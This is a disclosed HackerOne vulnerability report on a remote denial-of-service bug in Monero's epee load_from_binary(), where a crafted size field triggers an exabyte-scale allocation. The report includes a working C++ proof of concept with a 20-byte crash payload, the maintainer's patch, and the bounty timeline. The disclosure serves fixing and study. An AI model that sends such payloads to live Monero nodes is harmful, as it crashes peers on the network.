---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/uncontrolled-resource-consumption
  - env/web
  - vuln/dos
substate: "resolved"
weakness: "Uncontrolled Resource Consumption"
enriched: true
body: true
date: 2019-07-03
submitted: 2019-03-07T20:53:25.543Z
bounty_usd: null
votes: 2
cve: []
program: "[[programs/monero|Monero]]"
reporter: "guido"
source: "https://hackerone.com/reports/506498"
title: "(remote) exabyte allocation via load_from_binary() (DoS)"
---
# (remote) exabyte allocation via load_from_binary() (DoS)

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 2 | **Program:** Monero | **Disclosed:** 2019-07-03

- Report: [https://hackerone.com/reports/506498](https://hackerone.com/reports/506498)
- CWE: Uncontrolled Resource Consumption
- Submitted: 2019-03-07T20:53:25.543Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Changes introduced in commit b82efa32e can result in a denial of service if ```epee::serialization::portable_storage::load_from_binary()``` is called with untrusted data.

The 'reserve' method implemented here:
https://github.com/monero-project/monero/commit/b82efa32e771f653c5e49165b0659c67e2db3438#diff-8de201c60a8c7a3a0a4c2e15f2c0939bR75

will attempt to allocate about 4 exabytes of memory when you run the following code:

```cpp
#include <serialization/keyvalue_serialization.h>
#include <storages/portable_storage_template_helper.h>
#include <storages/portable_storage_base.h>
#include <p2p/p2p_protocol_defs.h>
#include <p2p/net_node.h>

int main(void)
{
    unsigned char payload[] = {
        0x01, 0x11, 0x01, 0x01, 0x01, 0x01, 0x02, 0x01, 0x01, 0x08, 0x00, 0x84,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff
    };

    const std::string s(payload, payload + 20);
    epee::serialization::portable_storage ps;
    ps.load_from_binary(s);
}
```

Although I haven't yet constructed a proof of concept against a live Monero instance, this can probably achieved by a remote attacker because the ```load_from_binary``` call occurs several times in the network code in ```contrib/epee/include/storages/levin_abstract_invoke2.h```.

Please let me know if this is sufficient, or that you require proof of concept code that can be used against peers on the network.

## Impact

Crash monerod

## Timeline

- **Report Filed**
- **2019-03-08** @moneromooo: No need, it's clear enough, thanks.
- **2019-03-08** @moneromooo: BTW, you've dropped from IRC, so: http://ccs.getmonero.org/ is ready at last if you want to write up your fuzz tests proposal.
- **2019-03-08** @moneromooo: I'll add this:

```
diff --git a/contrib/epee/include/storages/portable_storage_from_bin.h b/contrib/epee/include/storages/portable_storage_from_bin.h
index 2884f8c5e..e0a32b3ca 100644
--- a/contrib/epee/include/storages/portable_storage_from_bin.h
+++ b/contrib/epee/include/storages/portable_storage_from_bin.h
@@ -136,6 +136,7 @@ namespace epee
       //for pod types
       array_entry_t<type_name> sa;
       size_t size = read_varint();
+      CHECK_AND_ASSERT_THROW_MES(size <= m_count, "Size sanity check failed");
       sa.reserve(size);
       //TODO: add some optimization here later
       while(size--)
```

It at least adds a "one byte per element" sanity check. Same thing as already exists (and yes I know it's a bit of a weak check).
Not even compiled yet.
- **Report Triaged**
- **2019-03-09** @guido: I've confirmed that your patch resolves the bug.

I'll get back to you on IRC regarding the CCS.
- **2019-03-21** @anonimal: @guido  please post an XMR address if you wish to receive bounty.
- **2019-03-21** @guido: 48XB817vPzmEhwEGvw5zcLSnT1aRMBbN1jQUnUXMLpoyJE7jgXpdPsUNYgXg3ddcKbA2u3wpGqmHhT3DbTZCMjmV6vSY3bt
- **2019-03-26** @guido: Did you send any XMR? I cannot check due to wallet in offline storage.
- **2019-03-26** @anonimal: Hi @guido. I notified luigi last week so, when he's available, he'll send the funds and leave the txid here.
- **2019-03-26** @guido: Thanks
- **2019-04-02** @guido: Please send the funds, thanks.
- **2019-04-07** @guido: Please send the funds.
- **2019-04-08** @anonimal: Pinging @luigi1111 @luigi1111w
- **2019-04-10** @luigi1111w: Sent 3 XMR: 8f5fd28532e90762d40f50b340d4ff43687001f525fa7bc8efd0209c82c5911b
- **2019-04-10** @guido: Thanks
- **Swag Awarded**
- **Report Resolved**
- **2019-05-20** @guido: Ok but unless you applied a fix somewhere else, contrib/epee/include/storages/portable_storage_from_bin.h still hasn't been patched.
- **2019-05-20** @moneromooo: I'll PR the DoS fixes shortly before the release.

BTW, with the exchange rate up since a few weeks, it's a good time to submit a FFS/CCS request for fuzz testing if you're still up for it.
- **Agreed On Going Public**
- **Manually Disclosed**
